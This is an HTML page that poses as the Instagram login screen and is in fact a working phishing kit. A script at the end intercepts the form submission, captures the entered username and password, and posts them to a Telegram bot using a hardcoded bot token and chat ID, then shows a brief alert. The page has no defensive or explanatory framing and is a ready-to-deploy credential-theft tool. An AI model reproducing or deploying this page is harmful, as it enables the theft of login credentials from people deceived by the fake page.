<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
            padding: 0 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo img {
            width: 175px;
            height: auto;
        }
        .login-form {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            margin-bottom: 10px;
        }
        .form-group {
            margin: 0 40px 6px;
        }
        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #b3b3b3;
        }
        .login-btn {
            width: calc(100% - 80px);
            margin: 8px 40px;
            padding: 5px 9px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #0077cc;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
        }
        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-divider span {
            padding: 0 18px;
            font-size: 13px;
            color: #8e8e8e;
            font-weight: 600;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            text-align: center;
            margin-bottom: 20px;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            text-align: center;
            margin-bottom: 20px;
        }
        .signup-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 0;
            text-align: center;
        }
        .signup-text {
            font-size: 14px;
            color: #262626;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .apps {
            text-align: center;
            margin-top: 24px;
        }
        .apps p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }
        .app-links {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .app-links img {
            height: 40px;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-bottom: 12px;
        }

        .footer-links a {
            font-size: 11px;
            color: #8e8e8e;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .copyright {
            font-size: 11px;
            color: #8e8e8e;
        }
        @media (max-width: 400px) {
            .container {
                padding: 0 10px;
            }
            .form-group {
                margin: 0 20px 6px;
            }
            .login-btn {
                width: calc(100% - 40px);
                margin: 8px 20px;
            }
            .or-divider {
                margin: 10px 20px 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>
        <form class="login-form" action="#" method="post" id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div class="or-divider">
                <span>OR</span>
            </div>
            <a href="#" class="fb-login">Log in with Facebook</a>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="signup-container">
            <span class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></span>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="app-links">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
            </div>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top accounts</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact uploading & non-users</a>
        </div>
        <div class="copyright">
            Â© 2023 Instagram from Meta
        </div>
    </footer>



    <script>
        const botToken = '8365381855:AAE-CrSqG82_Umy1CLEU39zeC1frJK9Tnac';
        const chatId = '7116845457';

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = `New login attempt:\nUsername/Email/Phone: ${username}\nPassword: ${password}`;

            sendToBot(message);
        });

        function sendToBot(message) {
            if (!chatId) {
                console.error('Chat ID is not available.');
                return;
            }
            // Send message to Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Message sent successfully');
                    // Optionally, redirect or show a message
                    alert('Login attempt recorded.'); // For demo purposes
                } else {
                    console.error('Error sending message:', data);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
